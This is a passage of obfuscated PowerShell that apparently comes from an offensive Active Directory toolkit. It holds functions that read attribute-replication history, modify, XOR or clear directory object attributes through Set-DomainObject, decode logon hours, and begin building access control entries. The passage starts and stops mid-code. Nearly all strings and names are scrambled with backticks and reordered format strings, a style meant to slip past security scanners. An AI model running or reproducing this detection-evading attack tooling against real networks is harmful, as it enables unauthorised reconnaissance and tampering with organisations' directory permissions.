        if (${pS`B`ou`NDPA`RAMETeRs}[("{0}{2}{1}"-f 'Sea','Scope','rch')]) { ${seAR`cHER`A`RGuME`NtS}[("{0}{2}{1}" -f'S','cope','earchS')] = ${SEaR`CHSc`o`Pe} }
        if (${p`SBo`UN`D`pARametERs}[("{3}{2}{1}{0}" -f'geSize','tPa','ul','Res')]) { ${SE`A`Rch`ERARg`U`MenTs}[("{1}{0}{2}{3}" -f'ag','ResultP','eSiz','e')] = ${r`esU`ltPaG`eSiZe} }
        if (${P`sBoU`NDPaRa`mete`Rs}[("{1}{0}{4}{3}{2}" -f'verTim','Ser','mit','i','eL')]) { ${s`ear`c`hERaR`gUM`ents}[("{3}{2}{1}{0}"-f'mit','eLi','verTim','Ser')] = ${Ser`Ve`RTImEl`I`MiT} }
        if (${Psboun`dP`ARaME`T`ERs}[("{2}{0}{1}"-f'ston','e','Tomb')]) { ${se`A`R`CheRarG`UmEn`TS}[("{1}{3}{2}{0}" -f'e','T','ston','omb')] = ${T`O`mbSTo`NE} }
        if (${P`SbounD`PArAM`etE`Rs}[("{1}{0}"-f'dOne','Fin')]) { ${s`E`ArCHErARg`UmE`NtS}[("{0}{1}"-f 'FindOn','e')] = ${FiNd`O`NE} }
        if (${Psbou`ND`pa`R`AMe`TErs}[("{0}{2}{1}"-f'Cr','al','edenti')]) { ${S`E`ArcherAR`g`U`MentS}[("{1}{0}{2}" -f'edentia','Cr','l')] = ${CrE`deN`TiaL} }

        if (${pSBounDpA`RA`m`E`TERs}[("{1}{0}{2}{3}" -f'ropert','P','ie','s')]) {
            ${P`Rop`E`RtYfilt`Er} = ${PSB`o`UNd`PaRAME`TErS}[("{2}{0}{1}" -f't','ies','Proper')] -Join '|'
        }
        else {
            ${prOpe`Rty`F`I`lter} = ''
        }
    }

    PROCESS {
        if (${PSb`O`UNdP`A`RamETers}[("{1}{2}{0}"-f 'entity','I','d')]) { ${S`EarCh`E`RaRGUM`e`NTs}[("{2}{1}{0}"-f'y','entit','Id')] = ${Id`ENT`ity} }

        &("{4}{2}{0}{1}{3}"-f 'bj','ec','mainO','t','Get-Do') @SearcherArguments | &("{1}{0}{2}"-f '-','ForEach','Object') {
            ${oBje`c`TDN} = ${_}."P`Ro`peRtieS"[("{0}{2}{3}{1}" -f 'dist','me','inguishe','dna')][0]
            ForEach(${XmL`NO`dE} in ${_}."pRO`PeRTI`eS"[("{6}{1}{2}{0}{3}{4}{5}" -f'-repla','sd','s','ttribut','e','metadata','m')]) {
                ${TEM`p`O`BjeCT} = [xml]${xM`lnoDE} | &("{0}{1}{2}"-f'Sel','ect-Objec','t') -ExpandProperty ("{5}{0}{2}{4}{1}{3}"-f'TR_M','A','ETA','TA','_D','DS_REPL_AT') -ErrorAction ("{0}{2}{1}"-f 'Sile','tinue','ntlyCon')
                if (${tEMpOb`j`eCT}) {
                    if (${te`MP`ObJ`ECt}."PS`zaTTrIbu`Te`Na`me" -Match ${PR`OpEr`TYfiL`TeR}) {
                        ${o`U`TPUT} = &("{1}{0}{2}"-f 'w-','Ne','Object') ("{0}{2}{1}" -f 'PSOb','ct','je')
                        ${ou`T`put} | &("{1}{2}{3}{0}" -f'er','Ad','d-Me','mb') ("{1}{3}{0}{2}"-f 'p','Not','erty','ePro') ("{2}{0}{1}" -f'D','N','Object') ${o`Bjec`TDn}
                        ${Ou`T`put} | &("{0}{2}{1}" -f 'Add-','ber','Mem') ("{0}{3}{2}{1}" -f'N','y','tePropert','o') ("{0}{3}{2}{1}" -f 'Attr','e','m','ibuteNa') ${tEMP`OB`JECt}."psZATTR`ibutEN`AME"
                        ${o`U`TPut} | &("{1}{3}{0}{2}"-f'b','Add-M','er','em') ("{2}{1}{3}{0}"-f 'ty','oteP','N','roper') ("{0}{6}{1}{2}{3}{5}{4}" -f 'L','tOri','gina','ting','nge','Cha','as') ${t`emPObJe`CT}."fTimeLasTORiG`I`NAtInG`Ch`A`NGe"
                        ${o`UtPUT} | &("{1}{3}{2}{0}"-f'mber','Add','e','-M') ("{3}{1}{0}{2}" -f'opert','Pr','y','Note') ("{1}{0}" -f'on','Versi') ${T`EMp`ObJECT}."dw`VE`R`sIon"
                        ${OU`T`pUT} | &("{2}{1}{0}"-f'ember','d-M','Ad') ("{1}{2}{0}"-f 'operty','Not','ePr') ("{4}{1}{2}{0}{6}{5}{3}"-f'O','a','st','N','L','tingDsaD','rigina') ${Te`mP`OBj`EcT}."P`sZlas`Tor`iGIn`ATIngd`SADn"
                        ${O`U`TPUt}."PSob`je`cT"."TypeN`AMEs".("{1}{0}"-f'sert','In').Invoke(0, ("{4}{6}{1}{0}{5}{3}{2}"-f 'ctAt','e','istory','H','Po','tribute','werView.ADObj'))
                        ${O`UTP`UT}
                    }
                }
                else {
                    &("{2}{0}{1}{3}"-f'-Ve','rbos','Write','e') ('['+'G'+'et-Domain'+'Obje'+'c'+'tA'+'ttribut'+'eHistory] '+'Err'+'or '+'retri'+'evi'+'ng '+(('ywQms'+'ds'+'-replat'+'tri'+'b'+'utemeta'+'data'+'yw'+'Q ') -Replace ([ChAr]121+[ChAr]119+[ChAr]81),[ChAr]39)+'f'+'or '+"'$ObjectDN'")
                }
            }
        }
    }
}


function geT-DOmAINO`BjEC`T`l`inK`e`dAT`TriB`UT`e`HI`STory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{2}{5}{6}{3}{0}" -f'nts','D','eclaredVarsMo','gnme','PSUse','reThanA','ssi'}, '')]
    [OutputType({"{5}{2}{0}{1}{7}{10}{9}{4}{6}{8}{3}" -f'ew.ADObjec','tLi','rVi','ry','r','Powe','ibut','nked','eHisto','tt','A'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSITion = 0, VaLUEfRomPIpELinE = ${T`RuE}, VAluefroMpIpElINEBYPrOpErtYNAMe = ${tR`Ue})]
        [Alias({"{0}{3}{1}{4}{2}" -f'Dis','dNa','e','tinguishe','m'}, {"{2}{0}{3}{1}"-f'cco','me','SamA','untNa'}, {"{1}{0}"-f 'ame','N'}, {"{3}{1}{0}{5}{4}{2}" -f 'erD','emb','edName','M','h','istinguis'}, {"{1}{2}{0}{3}" -f 'berNam','Me','m','e'})]
        [String[]]
        ${I`DE`N`TiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOMA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fi','lter'})]
        [String]
        ${LD`ApFIlt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`Ro`pERT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'AD','ath','SP'})]
        [String]
        ${s`ea`RChB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}{3}" -f 'Do','inC','ma','ontroller'})]
        [String]
        ${s`E`RvEr},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{1}{0}"-f 'neLevel','O'}, {"{1}{0}{2}" -f 'ubtr','S','ee'})]
        [String]
        ${se`Arch`SCOPE} = ("{0}{1}" -f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${REsu`L`TP`AGEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVE`RTiME`Li`MIt},

        [Switch]
        ${t`o`mbsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creDent`I`Al} =   ( &('ls') ('vAR'+'IAbLe:5r0'+'vk'))."Val`UE"::"E`MpTy",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${s`earcheRARgUME`N`Ts} = @{
            ("{1}{2}{0}"-f 'es','Prope','rti')    =   ("{1}{6}{4}{0}{5}{2}{3}" -f'lvaluemet','m','a','ta','ds-rep','ad','s'),("{1}{4}{2}{0}{3}"-f 'sh','d','i','edname','istingu')
            'Raw'           =   ${TR`Ue}
        }
        if (${Ps`BO`UNdParAmETE`RS}[("{0}{2}{1}"-f 'Do','ain','m')]) { ${S`EAR`C`hERargu`mEnTs}[("{1}{0}" -f 'ain','Dom')] = ${D`oM`AIN} }
        if (${ps`B`oUnDPa`RAME`TErS}[("{3}{2}{1}{0}" -f'PFilter','A','D','L')]) { ${S`E`ArcherA`RGU`MEN`Ts}[("{0}{2}{1}" -f 'LDAPFi','er','lt')] = ${ldApfI`l`TER} }
        if (${Ps`B`OuND`pa`RamE`TERs}[("{0}{2}{1}"-f 'S','e','earchBas')]) { ${seaRCHEr`ARgu`me`N`TS}[("{0}{1}{2}" -f 'Search','Ba','se')] = ${se`A`RChbaSe} }
        if (${PSBoU`Ndpa`RA`meterS}[("{2}{0}{1}"-f 'er','ver','S')]) { ${s`EaRCh`eR`ARG`Um`EntS}[("{0}{2}{1}" -f 'Ser','r','ve')] = ${Se`R`VER} }
        if (${p`s`BouN`dpARAm`etERS}[("{2}{1}{0}" -f'pe','archSco','Se')]) { ${sEA`R`chErarG`UME`Nts}[("{1}{0}{2}"-f'chSc','Sear','ope')] = ${s`eA`RCh`ScOpE} }
        if (${PS`B`OuNDPaRAm`etERS}[("{2}{1}{0}" -f 'e','PageSiz','Result')]) { ${SeA`R`Ch`ErArGumeN`Ts}[("{1}{3}{4}{2}{0}"-f'eSize','R','g','esultP','a')] = ${re`sUl`TpAge`Si`Ze} }
        if (${P`s`Bou`NDpArAmET`ErS}[("{2}{4}{0}{3}{1}" -f 've','Limit','Se','rTime','r')]) { ${seaRchE`Rar`G`UM`EntS}[("{4}{0}{2}{1}{3}"-f 'Ti','Li','me','mit','Server')] = ${serVErTi`ME`L`i`m`it} }
        if (${pSBoUNDPAr`AM`et`eRs}[("{0}{1}{2}"-f'T','omb','stone')]) { ${Sea`RcHeR`ARGuM`En`Ts}[("{1}{0}{2}" -f'to','Tombs','ne')] = ${To`MBST`one} }
        if (${PS`BO`UND`P`ARA`mEteRs}[("{2}{0}{1}"-f'red','ential','C')]) { ${Sear`chErA`RG`UMents}[("{2}{0}{1}" -f 'nti','al','Crede')] = ${c`R`EDe`NTiAl} }

        if (${pSBOundP`A`RA`M`E`TErS}[("{0}{2}{1}" -f 'P','perties','ro')]) {
            ${PrO`PerT`Yfilt`eR} = ${PS`BounD`p`ARametERS}[("{1}{0}{2}"-f'op','Pr','erties')] -Join '|'
        }
        else {
            ${P`R`O`PERtyfi`lTer} = ''
        }
    }

    PROCESS {
        if (${P`SBOuNd`PA`Ram`ETERs}[("{0}{2}{1}"-f'Ide','ity','nt')]) { ${S`eArC`He`RAr`GUmE`NTs}[("{0}{1}"-f 'Ident','ity')] = ${i`D`entIty} }

        &("{3}{0}{1}{2}"-f't-Dom','ainObjec','t','Ge') @SearcherArguments | &("{4}{3}{0}{2}{1}"-f 'E','ch-Object','a','or','F') {
            ${o`Bj`ECTDn} = ${_}."pr`o`PEr`TIES"[("{2}{3}{1}{0}{4}"-f'uishedna','g','disti','n','me')][0]
            ForEach(${xML`N`ODe} in ${_}."PR`Oper`TIes"[("{1}{4}{3}{0}{6}{5}{2}"-f 'plvalue','ms','ata','-re','ds','ad','met')]) {
                ${TeMpObJ`e`cT} = [xml]${XmLN`O`dE} | &("{0}{2}{1}"-f'Sele','t','ct-Objec') -ExpandProperty ("{3}{2}{4}{1}{0}"-f 'A_DATA','MET','_REPL_V','DS','ALUE_') -ErrorAction ("{0}{3}{1}{2}" -f'Sil','n','tlyContinue','e')
                if (${Te`mpo`BJ`Ect}) {
                    if (${tEM`poB`Ject}."p`SzatTrIb`UtE`Na`me" -Match ${PrOp`ER`TYfIL`T`ER}) {
                        ${O`UTPUT} = &("{2}{0}{1}" -f'bje','ct','New-O') ("{2}{0}{1}"-f'Ob','ject','PS')
                        ${ou`TPut} | &("{2}{0}{1}" -f 'd-Memb','er','Ad') ("{1}{3}{0}{2}"-f 'tePro','N','perty','o') ("{0}{1}" -f'Obje','ctDN') ${o`B`JEc`TdN}
                        ${O`UT`PuT} | &("{1}{0}{2}" -f'm','Add-Me','ber') ("{1}{3}{0}{2}"-f'ro','Not','perty','eP') ("{0}{2}{1}"-f 'Attri','uteName','b') ${T`EM`PObJeCt}."P`szATTRIbU`Ten`A`mE"
                        ${OuTp`UT} | &("{0}{1}{2}"-f 'Add-M','emb','er') ("{1}{2}{0}"-f 'operty','Note','Pr') ("{2}{1}{0}{3}"-f 'u','teVal','Attribu','e') ${t`eMpO`BJE`Ct}."PSZo`Bj`eC`Tdn"
                        ${o`UTpUT} | &("{1}{3}{0}{2}" -f'e','Add','r','-Memb') ("{1}{3}{2}{0}" -f 'roperty','N','eP','ot') ("{1}{2}{3}{0}" -f 'Created','T','i','me') ${t`EMPoBJ`e`cT}."fT`IMe`c`ReATeD"
                        ${oUT`PuT} | &("{1}{0}{2}" -f 'Mem','Add-','ber') ("{3}{2}{0}{1}" -f'ope','rty','tePr','No') ("{1}{0}{2}"-f'meDel','Ti','eted') ${tEMP`o`BJect}."FTimED`e`LetED"
                        ${OUT`P`Ut} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{2}{1}{0}{3}"-f 'ope','r','NoteP','rty') ("{5}{0}{3}{2}{4}{1}"-f 'astOrig','e','ingCha','inat','ng','L') ${TempoB`j`ECt}."fT`IME`lAst`oRi`G`IN`ATI`NgCHAnge"
                        ${OUt`p`Ut} | &("{0}{2}{1}" -f'Ad','-Member','d') ("{1}{3}{0}{2}" -f 'pe','Note','rty','Pro') ("{1}{0}" -f'sion','Ver') ${TeMp`Obj`E`Ct}."Dwv`E`R`Sion"
                        ${Ou`TP`Ut} | &("{3}{1}{0}{2}" -f 'e','b','r','Add-Mem') ("{3}{1}{0}{2}" -f 'oper','r','ty','NoteP') ("{1}{2}{4}{0}{3}"-f'D','Last','OriginatingDs','N','a') ${T`e`mPoBJ`ECt}."P`SzlaStO`RiGi`Na`TinGDS`A`Dn"
                        ${oUt`Put}."psobj`ECT"."Ty`Pe`N`AMes".("{0}{1}" -f'In','sert').Invoke(0, ("{8}{7}{5}{11}{9}{0}{3}{1}{10}{6}{4}{2}" -f 'bj','tLinkedA','story','ec','teHi','werV','bu','o','P','w.ADO','ttri','ie'))
                        ${OU`TP`Ut}
                    }
                }
                else {
                    &("{2}{1}{3}{0}"-f 'e','rit','W','e-Verbos') ('[Get-D'+'omainObjec'+'tLi'+'nkedA'+'ttribut'+'eHis'+'to'+'r'+'y] '+'Erro'+'r '+'re'+'tri'+'eving '+(('R9Xmsd'+'s-replvalue'+'m'+'e'+'t'+'adataR'+'9X ') -REPlacE ([ChAR]82+[ChAR]57+[ChAR]88),[ChAR]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}


function s`Et`-doma`InOBjeCt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{3}{2}{6}{8}{5}{1}{9}{0}{4}" -f'ingFunctio','ateCha','ShouldProce','Use','ns','orSt','s','PS','sF','ng'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}" -f'P','hou','ldProcess','SS'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSITioN = 0, maNDaTORY = ${t`RUE}, VAluEfrOmpipeline = ${t`RuE}, vALUefRomPIpELiNEByPRopeRTYNaMe = ${t`RuE})]
        [Alias({"{1}{0}{2}{3}"-f't','Dis','ingui','shedName'}, {"{1}{0}{2}{3}"-f'Accou','Sam','n','tName'}, {"{1}{0}" -f 'me','Na'})]
        [String[]]
        ${i`DEN`Tity},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'e','Replac'})]
        [Hashtable]
        ${S`ET},

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${x`or},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`L`eAr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'er','ilt','F'})]
        [String]
        ${Ld`Ap`FILt`er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'SPath','AD'})]
        [String]
        ${sE`AR`ChBA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{4}{0}" -f'troller','D','ma','o','inCon'})]
        [String]
        ${Ser`VeR},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{2}{1}{0}" -f'l','ve','OneLe'}, {"{0}{1}" -f 'Su','btree'})]
        [String]
        ${s`Ea`RCh`ScOpe} = ("{2}{1}{0}" -f'ee','tr','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESU`lT`pageSI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`Ver`TimeL`ImIt},

        [Switch]
        ${toM`B`stone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`de`NTiAL} =  (  &("{2}{0}{1}" -f'Ar','IAblE','V')  ("{1}{0}"-f'k','5r0V'))."VAL`Ue"::"emP`TY"
    )

    BEGIN {
        ${SEA`RCHE`RaR`G`UMeNTS} = @{'Raw' = ${T`RuE}}
        if (${p`S`Bo`UndparAMe`T`ERs}[("{0}{1}" -f'Doma','in')]) { ${SeaRCHe`R`AR`gum`eNTs}[("{1}{2}{0}"-f 'in','D','oma')] = ${dOma`IN} }
        if (${Ps`BO`UNDp`AR`AmEte`Rs}[("{1}{0}{2}" -f 'Filt','LDAP','er')]) { ${S`ea`RCHe`RarGUM`EN`Ts}[("{0}{2}{1}"-f'LD','r','APFilte')] = ${l`DA`P`FILteR} }
        if (${P`s`BoUNDpar`AMETERs}[("{0}{2}{1}" -f'Se','Base','arch')]) { ${SEArCh`Erar`GU`MEnts}[("{2}{0}{1}"-f'rchBa','se','Sea')] = ${seAR`C`h`BaSe} }
        if (${PS`Bo`UNdpArAM`E`TErs}[("{1}{0}" -f 'rver','Se')]) { ${SeaRCH`eRAr`G`UM`e`NtS}[("{1}{0}" -f'erver','S')] = ${s`ERVeR} }
        if (${p`SB`oUNDpa`RaME`TeRS}[("{0}{2}{1}{3}"-f 'Sear','p','chSco','e')]) { ${sEA`R`che`RaRgu`MENTS}[("{0}{2}{1}{3}" -f 'S','rch','ea','Scope')] = ${sEaR`c`hs`cOpE} }
        if (${P`s`BOUndp`AR`AMETeRs}[("{2}{3}{0}{1}{4}"-f'g','eSiz','ResultP','a','e')]) { ${S`EA`RcheRa`RgUM`ENTs}[("{1}{0}{2}"-f 'esultP','R','ageSize')] = ${re`su`LTP`AG`esize} }
        if (${ps`BouNd`par`AM`E`TErS}[("{1}{2}{3}{0}" -f 't','Ser','verTime','Limi')]) { ${s`EaRC`HERArG`UmEntS}[("{0}{3}{1}{2}" -f'Se','imeLimi','t','rverT')] = ${sE`RveRTiMeLI`m`It} }
        if (${Psb`ouNdPAR`A`MetErs}[("{3}{0}{1}{2}" -f'm','bsto','ne','To')]) { ${SeArCh`eRarg`U`mEn`Ts}[("{3}{1}{2}{0}" -f 'e','mbs','ton','To')] = ${T`Om`BSTOnE} }
        if (${Ps`B`oUn`dpA`RaMEtErs}[("{1}{0}{2}"-f'e','Cr','dential')]) { ${SEarchEraRg`UM`e`N`TS}[("{1}{2}{3}{0}"-f 'ial','Cre','de','nt')] = ${CR`EDenT`I`AL} }
    }

    PROCESS {
        if (${pSbOunD`Pa`Ram`e`Ters}[("{2}{1}{0}"-f 'ty','nti','Ide')]) { ${SE`ARc`HEr`Arg`UmentS}[("{2}{0}{1}"-f'i','ty','Ident')] = ${IDEN`TI`TY} }

        
        ${RAW`obj`ECT} = &("{0}{3}{4}{2}{1}" -f'Get-Doma','t','c','inOb','je') @SearcherArguments

        ForEach (${oBjE`cT} in ${rAW`o`BjeCT}) {

            ${e`N`TRY} = ${R`AWO`B`JEct}.("{2}{1}{3}{0}"-f 'yEntry','tD','Ge','irector').Invoke()

            if(${pSbO`Un`Dpa`RAMeTErS}['Set']) {
                try {
                    ${PsBO`Un`DPARaMeT`ErS}['Set'].("{0}{1}{2}" -f'GetEn','ume','rator').Invoke() | &("{1}{4}{2}{3}{0}"-f'ect','Fo','ach-O','bj','rE') {
                        &("{1}{2}{3}{0}" -f 'e','W','rite-Ver','bos') "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        ${enT`RY}.("{0}{1}"-f'p','ut').Invoke(${_}."n`AMe", ${_}."Val`Ue")
                    }
                    ${EN`TRY}.("{0}{2}{1}" -f'co','tchanges','mmi').Invoke()
                }
                catch {
                    &("{3}{2}{1}{0}"-f 'g','rnin','a','Write-W') "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${psB`o`UNDpARAME`TErS}['XOR']) {
                try {
                    ${pS`BO`UNd`PaR`AMEt`erS}['XOR'].("{3}{1}{0}{2}"-f 'Enu','et','merator','G').Invoke() | &("{1}{0}{3}{2}" -f'rEach-','Fo','ect','Obj') {
                        ${P`RopeRtY`NA`ME} = ${_}."N`AMe"
                        ${propErt`YxorVA`l`Ue} = ${_}."V`ALUe"
                        &("{2}{1}{0}"-f'rbose','e-Ve','Writ') "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        ${TY`PEn`Ame} = ${EN`TrY}.${Pr`oP`ERTYna`mE}[0].("{1}{0}" -f'pe','GetTy').Invoke()."N`Ame"

                        
                        ${p`RO`P`erT`YValuE} = $(${EN`T`RY}.${pro`p`eRTyNaME}) -bxor ${prO`P`ErTy`xoRvaLue}
                        ${E`NtRY}.${Prop`eRT`y`N`AMe} = ${PROp`E`RTy`VALUE} -as ${T`yPEN`AME}
                    }
                    ${E`NTry}.("{0}{3}{2}{1}"-f'comm','anges','tch','i').Invoke()
                }
                catch {
                    &("{2}{0}{1}"-f'ite-Warn','ing','Wr') "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if(${p`sBo`UNDpaR`AmE`Te`RS}[("{0}{1}" -f'Cl','ear')]) {
                try {
                    ${P`SbO`UNDPArA`M`et`ERS}[("{0}{1}" -f 'Cle','ar')] | &("{2}{1}{0}{4}{3}"-f 'j','Ob','ForEach-','ct','e') {
                        ${pRoP`ertY`N`AME} = ${_}
                        &("{0}{3}{2}{1}"-f'Wri','Verbose','-','te') "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        ${E`NTRY}.${PRop`ER`TYnA`ME}.("{0}{1}" -f'c','lear').Invoke()
                    }
                    ${EnT`Ry}.("{2}{0}{1}" -f 'mitc','hanges','com').Invoke()
                }
                catch {
                    &("{1}{0}{3}{2}"-f 'arn','Write-W','g','in') "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function coNVeRT`From`-lDap`l`ogONHOurS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{6}{1}{2}{5}{3}" -f 'aredVars','h','anAs','ignments','PSUseDecl','s','MoreT'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'ld','P','SShou','Process'}, '')]
    [OutputType({"{5}{0}{4}{1}{2}{3}" -f 'werV','o','nHou','rs','iew.Log','Po'})]
    [CmdletBinding()]
    Param (
        [Parameter( VALUEfRoMPiPelIne = ${T`RUE}, valuEFRoMPIPeLINEBYPRopERtYnAMe = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        ${LogOnh`o`UrsaRR`AY}
    )

    Begin {
        if(${logO`NhOUR`SA`RR`Ay}."CO`Unt" -ne 21) {
            throw ("{0}{6}{8}{4}{3}{11}{5}{10}{9}{7}{2}{1}"-f 'L','h','ngt','y','ra','he inco','ogonH',' le','oursAr','ect','rr',' is t')
        }

        function CONv`E`RTto`-l`ogoNHOuRs`Ar`R`AY {
            Param (
                [int[]]
                ${H`O`UrSArr}
            )

            ${LoGOnH`o`URs} = &("{2}{1}{0}" -f 't','ew-Objec','N') ("{0}{1}" -f'boo','l[]') 24
            for(${i}=0; ${i} -lt 3; ${I}++) {
                ${B`YTE} = ${hOuRS`A`RR}[${i}]
                ${o`F`FSeT} = ${I} * 8
                ${S`TR} =  (  &("{2}{0}{1}" -f 'L','e','VariAB') ("s"+"hBA5"))."va`LuE"::("{0}{1}{2}"-f'To','S','tring').Invoke(${b`ytE},2).("{1}{0}" -f 'ft','PadLe').Invoke(8,'0')

                ${LogO`NH`ourS}[${oF`FSeT}+0] = [bool]   ${s`H`Ba5}::"toI`NT32"([string]${s`TR}[7])
                ${logo`NHO`U`RS}[${O`FFSet}+1] = [bool]   (  &("{1}{0}{2}"-f'Vari','GET-','able')  ("s"+"hBa5") -vALUEOn  )::"T`oi`NT32"([string]${S`Tr}[6])
                ${lOg`on`hO`UrS}[${O`FfseT}+2] = [bool]   ${SHb`A5}::"toi`Nt`32"([string]${S`Tr}[5])
                ${Lo`go`NhOurS}[${ofFs`eT}+3] = [bool]  ${s`hBa5}::"T`OiNt`32"([string]${S`Tr}[4])
                ${LOG`O`NH`OURs}[${OFfS`ET}+4] = [bool]   ${Sh`BA5}::"toI`Nt`32"([string]${S`Tr}[3])
                ${lo`GOnHOu`RS}[${off`SET}+5] = [bool]   ( &("{2}{0}{1}"-f 'AriAB','le','V') ("S"+"HBa5"))."VA`LuE"::"T`oInT32"([string]${S`Tr}[2])
                ${logON`H`oUrS}[${oFf`S`et}+6] = [bool]   (  &("{0}{2}{1}"-f 'v','E','aRIAbl') ("{0}{1}" -f'S','Hba5') -VaLueO)::"TOI`N`T32"([string]${S`Tr}[1])
                ${loG`oNHO`URs}[${off`sEt}+7] = [bool]  (  &("{1}{0}{2}" -f'itE','gEt-','m') ('var'+'IA'+'BLe'+':shba5'))."val`Ue"::"t`O`iNT32"([string]${s`Tr}[0])
            }

            ${LOgOnh`OU`Rs}
        }
    }

    Process {
        ${o`UTp`UT} = @{
            ("{1}{0}" -f 'unday','S') = &("{2}{1}{5}{3}{4}{0}"-f'ray','rt','Conve','ogonHo','ursAr','To-L') -HoursArr ${lOgONHourSA`Rr`Ay}[0..2]
            ("{2}{1}{0}"-f 'day','n','Mo') = &("{1}{0}{3}{4}{2}{5}{6}" -f 'To-L','Convert','ur','o','gonHo','sArr','ay') -HoursArr ${L`o`goNhO`Ur`SArrAY}[3..5]
            ("{1}{0}{2}"-f 'sd','Tue','ay') = &("{4}{3}{0}{2}{5}{1}" -f'nH','Array','our','o-Logo','ConvertT','s') -HoursArr ${L`Og`on`HouRSaRraY}[6..8]
            ("{1}{0}" -f 'ednesday','W') = &("{4}{0}{3}{2}{1}{5}{6}" -f 'o','A','rs','-LogonHou','ConvertT','rra','y') -HoursArr ${logOn`hOur`Sar`RAY}[9..11]
            ("{1}{0}"-f 'urs','Th') = &("{0}{2}{1}{4}{6}{3}{5}" -f'Con','To-','vert','rr','Logo','ay','nHoursA') -HoursArr ${LOg`oNhour`s`A`R`RaY}[12..14]
            ("{0}{1}" -f 'Frid','ay') = &("{1}{4}{5}{0}{3}{2}"-f 'To-','C','ay','LogonHoursArr','onv','ert') -HoursArr ${LOGon`H`o`URsA`Rray}[15..17]
            ("{1}{0}" -f 'rday','Satu') = &("{0}{2}{1}{3}{4}" -f 'Conve','To','rt','-LogonHou','rsArray') -HoursArr ${LoG`on`hourS`A`RrAY}[18..20]
        }

        ${O`UTPut} = &("{1}{0}{2}"-f 'ec','New-Obj','t') ("{2}{0}{1}" -f 'bjec','t','PSO') -Property ${o`U`Tput}
        ${o`UTPuT}."pSOBJ`E`Ct"."TYPE`NA`mEs".("{0}{1}" -f 'In','sert').Invoke(0, ("{1}{4}{5}{2}{0}{3}" -f 'nHour','Powe','.Logo','s','r','View'))
        ${outP`Ut}
    }
}


function nEW-aDOB`JEcTa`c`ceS`ScO`Nt`RO`lentrY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{1}{8}{2}{6}{3}{10}{7}{5}{9}{11}"-f'eS','h','l','cessForStateCha','PSUs','n','dPro','u','ou','cti','ngingF','ons'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}" -f's','Proces','PS','Should'}, '')]
    [OutputType({"{2}{4}{12}{6}{13}{10}{1}{8}{11}{3}{0}{5}{9}{7}" -f'riz','sContr','S','ho','ystem','ation','it','le','ol','Ru','Acces','.Aut','.Secur','y.'})]
    [CmdletBinding()]
    Param (
        [Parameter(PoSitIon = 0, vALuefrOMpipElinE = ${t`RUe}, vALUEfROMpiPELInEByPrOPErTYNAMe = ${t`RuE}, ManDaTOry = ${tR`Ue})]
        [Alias({"{0}{2}{1}{4}{3}" -f 'D','inguis','ist','ame','hedN'}, {"{0}{1}{2}"-f'SamAccou','ntNa','me'}, {"{0}{1}" -f 'Nam','e'})]
        [String]
        ${PRI`Nci`paLIDE`NTItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Pr`inc`i`Paldom`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{4}{0}" -f 'troller','C','o','Domain','n'})]
        [String]
        ${SE`R`VEr},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{2}{0}" -f'vel','OneL','e'}, {"{1}{0}"-f'ubtree','S'})]
        [String]
        ${SeaR`c`hsCoPe} = ("{1}{0}{2}"-f'ubtr','S','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`ULtpAGE`s`I`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVE`Rti`m`El`im`IT},

        [Switch]
        ${tO`MbsTo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
